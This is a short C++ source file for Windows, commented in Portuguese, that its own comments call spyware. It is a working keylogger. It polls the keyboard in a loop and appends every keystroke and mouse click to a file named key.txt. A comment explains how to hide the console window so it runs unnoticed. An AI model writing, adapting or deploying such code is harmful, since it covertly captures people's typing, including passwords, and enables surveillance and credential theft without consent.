#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <map>
using namespace std;

//pra ser direto, esse spyware monitora seu teclado.

void leia(LPCSTR texto);
bool propo(int chave);

main(){

    /*
	antes de mais nada, se voc� quer uma coisa "funcional", voc� precisaria esconder o console. ent�o....
	  HWND myWindow = GetConsoleWindow();
      ShowWindow(myWindow, SW_HIDE);
    assim o console vai ficar escondido.
    por via das d�vidas, se voc� fizer isso e der merda, voc� simplesmente pode dar um
       ShowWindow(myWindow, SW_SHOW);
    � isso
    */
    
    //agora pra fazer um app desse inicializar junto com o sistema eu n�o sei. mas voc� pode fazer isso em muitas outras coisas
    //se voc� for usar isso para o mal, tu � mt � um baitola
    
    
    unsigned char chave;    //unsigned porque um signed char s� vai at� 127
    while (true)
    {
        Sleep(10);  //pequena pausa
        for (chave = 8; chave <= 190; chave++)
        {
            if (GetAsyncKeyState(chave) == -32767)
            {
                if (propo(chave) == false)
                {
                    cout << chave;
                    ofstream log;
                    log.open("key.txt", fstream::app);
                    log << chave;
                    log.close();
                }
            }
        }



    }
    return 0;
}
void leia(LPCSTR texto){  
    ofstream log;
    log.open("key.txt", fstream::app);  //ofstream para guardarmos a atividade do keyboard
    log << texto;
    log.close();
}

bool propo(int chave){
	map<int,string> tecla; //aqui usei um map, mas voc� poderia facilmente usar um switch para o int ao inves de criar um map e usar if
	tecla [VK_SPACE]=" ";
	tecla [VK_SHIFT]=" SHIFT ";
	tecla [VK_RETURN]="\n";
	tecla [VK_BACK]=" \b ";
	tecla [VK_RBUTTON]="   *RCLICK   ";
	tecla [VK_LBUTTON]="   *LCLICK   ";
	

    if (chave == VK_SPACE){     
        cout<<tecla[VK_SPACE];
        leia(" ");
    }

        if (chave == VK_SHIFT){
		

        cout<<tecla[VK_SHIFT];
        leia("  SHIFT  ");
    }
        if (chave==VK_RETURN)
        {
        	    cout<<tecla[VK_RETURN];
        	    leia("\n");
		}
        if(chave==VK_BACK)
        {
        	
          cout<<tecla[VK_BACK];
        leia(" BACKSPACE ");
}
        if(chave==VK_RBUTTON)
        {
        	
        cout<<tecla[VK_RBUTTON];
        leia(" RCLICK ");
 }
        if(chave==VK_LBUTTON)
        {
        	
		
            cout <<tecla[VK_LBUTTON];
        leia(" *LCLICK ");
       }
    
    if(chave!=VK_LBUTTON&&chave!=VK_RBUTTON&&chave!=VK_BACK&&chave!=VK_SPACE&&chave!=VK_SHIFT&&chave!=VK_RETURN)  
    return false; //caso n�o tenha nenhuma key do teclado pressionada, retorna falso, ent�o a m�gica rola por si s�
    
}
